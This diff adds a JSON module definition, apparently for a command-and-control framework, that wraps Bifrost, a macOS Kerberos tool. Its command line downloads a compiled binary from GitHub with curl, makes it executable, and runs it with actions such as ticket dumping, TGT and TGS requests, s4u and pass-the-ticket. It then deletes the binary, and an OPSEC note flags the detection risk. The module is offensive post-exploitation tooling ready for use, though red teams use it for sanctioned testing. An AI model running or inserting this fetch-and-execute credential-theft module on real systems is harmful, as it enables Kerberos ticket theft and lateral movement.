@@ -1,0 +1,40 @@
+{
+  "base": {
+    "name": "Bifrost",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Cody Thomas (@its_a_feature_)"],
+    "path": ["darwin", "x64", "objective-c", "kerberos", "bifrost.json"],
+    "platform": "darwin",
+    "arch": "x64",
+    "lang": "objective-c",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/its-a-feature/bifrost/master/compiled_binaries/bifrost",
+    "options": [
+      {"name": "filename", "value": "bifrost", "flag": "-o", "required": true, "description":"The name to save the bifrost file as"},
+      {"name": "action", "value": "list", "flag": "-action", "required": true, "description":"bifrost action to take. [dump | list | askhash | describe | asktgt | asktgs | s4u | ptt | remove]"},
+      {"name": "args", "value": "", "flag": "", "required": false, "description":"arguments to pass with the provided bifrost action"}
+    ],
+    "description": "Objective-C library and console to interact with Heimdal APIs for macOS Kerberos. This module downloads a compiled version of Bifrost to host, executes the command, and deletes the downloaded binary.",
+    "notes": "View the README at https://github.com/its-a-feature/bifrost/blob/master/README.md for a list of commands.\r\n\r\n\t**OPSEC NOTE** This module connects directly to GitHub and writes a file to disk.",
+    "commands": [
+      "/bin/sh",
+      "-c",
+      "\"curl",
+      "{{filename}}",
+      "-s",
+      "https://raw.githubusercontent.com/its-a-feature/bifrost/master/compiled_binaries/bifrost",
+      "&&",
+      "chmod +x",
+      "{{filename.Value}}",
+      "&&",
+      "./{{filename.Value}}",
+      "{{action}}",
+      "{{args.Value}}",
+      ";",
+      "rm",
+      "{{filename.Value}}\""
+    ],
+    "Comments": "If you think this is cool, check out Mythic at https://github.com/its-a-feature/Mythic."
+  }
+}
